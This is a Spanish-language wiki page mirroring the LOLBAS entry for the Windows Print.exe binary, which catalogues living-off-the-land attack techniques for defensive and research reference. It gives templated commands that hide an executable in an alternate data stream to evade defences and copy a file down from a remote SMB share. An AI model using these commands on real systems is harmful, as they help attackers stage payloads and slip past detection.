# LOLBAS: Print.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `ADS`, `Copy`

Used by Windows to send files to the printer

## Comandos

### Hide binary file in alternate data stream to potentially bypass defensive counter measures

ADS · priv: User · T1564.004

```cmd
print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}
```

Copy file.exe into the Alternate Data Stream (ADS) of file.txt.

### Copy files

Copy · priv: User · T1105

```cmd
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}
```

Copy file from source to destination

### Copy/Download file from remote server

Copy · priv: User · T1105

```cmd
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}
```

Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.

